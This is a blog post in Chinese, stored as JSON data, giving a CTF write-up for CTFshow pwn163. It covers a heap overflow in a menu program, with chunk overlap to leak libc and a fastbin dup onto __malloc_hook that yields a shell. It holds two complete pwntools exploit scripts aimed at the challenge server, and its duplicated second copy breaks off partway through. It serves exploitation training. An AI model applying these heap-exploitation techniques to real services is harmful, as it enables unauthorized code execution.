pwn163","published":1,"date":"2025-06-22T12:08:58.257Z","updated":"2025-06-23T05:47:53.798Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2ib001auomyebow6wn1","content":"<h1 id=\"CTFshow-pwn163（堆块重叠-fastbin-）\"><a href=\"#CTFshow-pwn163（堆块重叠-fastbin-）\" class=\"headerlink\" title=\"CTFshow pwn163（堆块重叠|fastbin ）\"></a>CTFshow pwn163（堆块重叠|fastbin ）</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​        这两天在看IO_FILE 的相关利用，实在是给我看晕了。各种house of 确实有点东西。但是到最后发现自己的基础还是不够，除了fastbins 和 unsorted bins 稍微了解一点。其他的机制可以说是一坨。回来写点题，补一下基础。然后在结合这些基本的手法，去看高级的利用链。这个就是利用堆的布局，去达到我们的目的。或许也可以叫堆风水。<br>​        突然觉得堆风水这个名字起得太好了，主要可以自己构造布局，为我所控。真有一种<strong>盖周天之变，化吾为王</strong> 的感觉。</p>\n<h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"edit函数\"><a href=\"#edit函数\" class=\"headerlink\" title=\"edit函数\"></a>edit函数</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250529222118413.png\" alt=\"image-20250529222118413\"><br>1.其他函数没有漏洞。只有edit，对size 没有检查，可以溢出。<br>2.在它的heaplist上会设置标志位检查这个堆块是否被free。<br>3.show的时候，会根据add时的size 进行打印内容。<br>4.add是采用calloc分配空间，初始化都为1。<br>5.free会把指针置空，size置0，标志置0。<br>6.并且，这是一道保护机制全开的题目。</p>\n<h2 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h2><p>1.首先第一点是要泄露libc。由于保护机制全开，无法修改got表，同时程序的基地址无法获取。所以unlink的手段失效。显然是需要去修改hook。泄露libc的手段，是通过main_arena,也就是通过unsorted bins 中的堆块。由于add 会对堆块里的数据破坏，所以只能在堆块处于free 状态下打印。可是题目没有uaf 的漏洞，所以要让一个堆块又处于free 又处于 used 状态下。<br>2.如何构造呢？在这里提供两种思路。第一种思路：我们通过两个大小相同为size ，且地址连续的unsorted bin 的chunk来构造一个重叠。通过溢出，将第一个堆块的大小，修改为两个堆块的大小。然后free掉第一个堆块。此时libc会认为，第一个堆块的大小是2*size，所以实际上libc会把两个堆块的空间都放入unsorted bins中。此时再申清，size大小的堆块，就可以把第一个堆块申请出来，并且会把main_arena+0x58 写入到第二个堆块中去。此时只要show就可以拿到信息了；第二种思路，是通过fastbin ，把已经分配的空间再分配，来完成的。首先将小堆块free 放入fastbins，然后通过溢出修改其fd指针，指向目标unsorted bin 的chunk，通过两次add，把这块空间再分配，那么两个指针指向同一块空间了。之后free 大堆块，将其放入unsorted bin中，再show 小堆块，就可以拿到信息了。<br>3.拿到libc的信息之后，稍加计算得到malloc_hook 和 relloc的地址。然后就是fastbin dup 。在这里，本地打通之后，思路就是没问题的。但是远程会出现打不通的情况。原因是ibc版本不同所造成的偏移不一样。因此libcbase，one_gadget ，等地址可能会不一样。所以要打通远程得有正确的偏移。</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"思路一\"><a href=\"#思路一\" class=\"headerlink\" title=\"思路一\"></a>思路一</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>,<span class=\"string\">&#x27;-l&#x27;</span>,<span class=\"string\">&#x27;66%&#x27;</span>]</span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;pwn&quot;</span>,<span class=\"string\">&quot;pwn.challenge.ctf.show&quot;</span>,<span class=\"number\">28248</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/home/tsq/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Command: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Size: &quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Command: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Size: &quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;Content: &quot;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Command: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Command: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">4</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>) <span class=\"comment\"># 0  全责哥</span></span><br><span class=\"line\">add(<span class=\"number\">0x68</span>) <span class=\"comment\"># 1  半责哥</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>) <span class=\"comment\"># 2  堆块重叠</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>) <span class=\"comment\"># 3  被重叠了</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>) <span class=\"comment\"># 4  </span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>) <span class=\"comment\"># 5</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"number\">0x6a</span>,<span class=\"string\">b&#x27;\\x41&#x27;</span>*<span class=\"number\">0x68</span>+<span class=\"string\">b&#x27;\\x21\\x01&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">show(<span class=\"number\">3</span>)</span><br><span class=\"line\">io.recv(<span class=\"number\">0x12</span>)</span><br><span class=\"line\"><span class=\"comment\">#libcbase=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x3c3b78</span></span><br><span class=\"line\">libcbase=u64(io.recvuntil(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x3c4b78</span></span><br><span class=\"line\">logvalue(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">malloc_hook=libcbase+<span class=\"number\">0x3c4b10</span></span><br><span class=\"line\">realloc=libcbase+<span class=\"number\">0x846c0</span></span><br><span class=\"line\">logvalue(<span class=\"string\">&quot;malloc_hook&quot;</span>,<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\">one_gadget=libcbase+<span class=\"number\">0x4526a</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x38</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">5</span>+p64(<span class=\"number\">0x71</span>)+p64(malloc_hook-<span class=\"number\">0x23</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x68</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"number\">0x68</span>) <span class=\"comment\"># 6</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0xb</span>+p64(one_gadget)+p64(realloc+<span class=\"number\">8</span>)</span><br><span class=\"line\">edit(<span class=\"number\">7</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;Command: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;Size: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x68</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"思路二\"><a href=\"#思路二\" class=\"headerlink\" title=\"思路二\"></a>思路二</h3><p>懒得写了，直接那官方的题解了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28145</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/home/bit/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Alloc</span>(<span class=\"params\">size</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Size:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Fill</span>(<span class=\"params\">index,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Index:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Size:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(content)))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Content:&#x27;</span>)</span><br><span class=\"line\">    io.send(content)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Free</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Index:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Dump</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Index:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Content: \\n&#x27;</span>)</span><br><span class=\"line\">    A = io.recvline()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> A</span><br><span class=\"line\"></span><br><span class=\"line\">Alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">Free(<span class=\"number\">1</span>)</span><br><span class=\"line\">Free(<span class=\"number\">2</span>)</span><br><span class=\"line\">padding = p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">payload = padding*<span class=\"number\">2</span> + p8(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">Fill(<span class=\"number\">0</span>, payload)</span><br><span class=\"line\">Fill(<span class=\"number\">3</span>, padding)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x91</span>)</span><br><span class=\"line\">Fill(<span class=\"number\">3</span>, payload)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">Free(<span class=\"number\">4</span>)</span><br><span class=\"line\">libc_base = u64(Dump(<span class=\"number\">2</span>)[:<span class=\"number\">8</span>].ljust(<span class=\"number\">8</span>, <span class=\"string\">&quot;\\x00&quot;</span>))-<span class=\"number\">0x3c4b78</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">    </span><br><span class=\"line\">Alloc(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">Free(<span class=\"number\">4</span>)</span><br><span class=\"line\">payload = p64(libc_base + <span class=\"number\">0x3c4aed</span>)</span><br><span class=\"line\">Fill(<span class=\"number\">2</span>, payload)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">one = libc_base + <span class=\"number\">0x4526a</span></span><br><span class=\"line\">payload = p8(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span> + p64(one)</span><br><span class=\"line\">Fill(<span class=\"number\">6</span>, payload)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>","excerpt":"","more":"<h1 id=\"CTFshow-pwn163（堆块重叠-fastbin-）\"><a href=\"#CTFshow-pwn163（堆块重叠-fastbin-）\" class=\"headerlink\" title=\"CTFshow pwn163（堆块重叠|fastbin ）\"></a>CTFshow pwn163（堆块重叠|fastbin ）</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​        这两天在看IO_FILE 的相关利用，实在是给我看晕了。各种house of 确实有点东西。但是到最后发现自己的基础还是不够，除了fastbins 和 unsorted bins 稍微了解一点。其他的机制可以说是一坨。回来写点题，补一下基础。然后在结合这些基本的手法，去看高级的利用链。这个就是利用堆的布局，去达到我们的目的。或许也可以叫堆风水。<br>​        突然觉得堆风水这个名字起得太好了，主要可以自己构造布局，为我所控。真有一种<strong>盖周天之变，化吾为王</strong> 的感觉。</p>\n<h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"edit函数\"><a href=\"#edit函数\" class=\"headerlink\" title=\"edit函数\"></a>edit函数</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250529222118413.png\" alt=\"image-20250529222118413\"><br>1.其他函数没有漏洞。只有edit，对size 没有检查，可以溢出。<br>2.在它的heaplist上会设置标志位检查这个堆块是否被free。<br>3.show的时候，会根据add时的size 进行打印内容。<br>4.add是采用calloc分配空间，初始化都为1。<br>5.free会把指针置空，size置0，标志置0。<br>6.并且，这是一道保护机制全开的题目。</p>\n<h2 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h2><p>1.首先第一点是要泄露libc。由于保护机制全开，无法修改got表，同时程序的基地址无法获取。所以unlink的手段失效。显然是需要去修改hook。泄露libc的手段，是通过main_arena,也就是通过unsorted bins 中的堆块。由于add 会对堆块里的数据破坏，所以只能在堆块处于free 状态下打印。可是题目没有uaf 的漏洞，所以要让一个堆块又处于free 又处于 used 状态下。<br>2.如何构造呢？在这里提供两种思路。第一种思路：我们通过两个大小相同为size ，且地址连续的unsorted bin 的chunk来构造一个重叠。通过溢出，将第一个堆块的大小，修改为两个堆块的大小。然后free掉第一个堆块。此时libc会认为，第一个堆块的大小是2*size，所以实际上libc会把两个堆块的空间都放入unsorted bins中。此时再申清，size大小的堆块，就可以把第一个堆块申请出来，并且会把main_arena+0x58 写入到第二个堆块中去。此时只要show就可以拿到信息了；第二种思路，是通过fastbin ，把已经分配的空间再分配，来完成的。首先将小堆块free 放入fastbins，然后通过溢出修改其fd指针，指向目标unsorted bin 的chunk，通过两次add，把这块空间再分配，那么两个指针指向同一块空间了。之后free 大堆块，将其放入unsorted bin中，再show 小堆块，就可以拿到信息了。<br>3.拿到libc的信息之后，稍加计算得到malloc_hook 和 relloc的地址。然后就是fastbin dup 。在这里，本地打通之后，思路就是没问题的。但是远程会出现打不通的情况。原因是ibc版本不同所造成的偏移不一样。因此libcbase，one_gadget ，等地址可能会不一样。所以要打通远程得有正确的偏移。</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"思路一\"><a href=\"#思路一\" class=\"headerlink\" title=\"思路一\"></a>思路一</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>,<span class=\"string\">&#x27;-l&#x27;</span>,<span class=\"string\">&#x27;66%&#x27;</span>]</span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;pwn&quot;</span>,<span class=\"string\">&quot;pwn.challenge.ctf.show&quot;</span>,<span class=\"number\">28248</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/home/tsq/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Command: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Size: &quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Command: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Size: &quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;Content: &quot;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Command: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Command: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">4</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>) <span class=\"comment\"># 0  全责哥</span></span><br><span class=\"line\">add(<span class=\"number\">0x68</span>) <span class=\"comment\"># 1  半责哥</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>) <span class=\"comment\"># 2  堆块重叠</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>) <span class=\"comment\"># 3  被重叠了</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>) <span class=\"comment\"># 4  </span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>) <span class=\"comment\"># 5</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"number\">0x6a</span>,<span class=\"string\">b&#x27;\\x41&#x27;</span>*<span class=\"number\">0x68</span>+<span class=\"string\">b&#x27;\\x21\\x01&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">show(<span class=\"number\">3</span>)</span><br><span class=\"line\">io.recv(<span class=\"number\">0x12</span>)</span><br><span class=\"line\"><span class=\"comment\">#libcbase=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x3c3b78</span></span><br><span class=\"line\">libcbase=u64(io.recvuntil(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x3c4b78</span></span><br><span class=\"line\">logvalue(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">malloc_hook=libcbase+<span class=\"number\">0x3c4b10</span></span><br><span class=\"line\">realloc=libcbase+<span class=\"number\">0x846c0</span></span><br><span class=\"line\">logvalue(<span class=\"string\">&quot;malloc_hook&quot;</span>,<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\">one_gadget=libcbase+<span class=\"number\">0x4526a</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x38</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">5</span>+p64(<span class=\"number\">0x71</span>)+p64(malloc_hook-<span class=\"number\">0x23</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x68</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"number\">0x68</span>) <span class=\"comment\"># 6</span></span><br><span 